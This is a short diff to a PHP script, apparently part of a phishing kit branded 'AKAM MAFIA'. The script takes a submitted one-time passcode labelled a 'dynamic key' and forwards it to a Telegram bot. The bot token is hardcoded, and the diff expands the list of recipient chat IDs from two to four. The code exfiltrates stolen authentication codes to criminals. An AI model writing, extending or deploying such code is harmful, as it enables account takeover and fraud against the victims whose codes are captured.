@@ -20,7 +20,12 @@ if (!empty($otp)) {
 
     // 3. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-    $chat_ids = ["8114050673", "8518977918"]; 
+    $chat_ids = [
+    "8114050673", 
+    "8518977918", 
+    "8638340940", 
+    "8645545892"
+];
 
     // 4. Formato del mensaje
     $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - CLAVE DINÁMICA</b> ⭐\n\n";
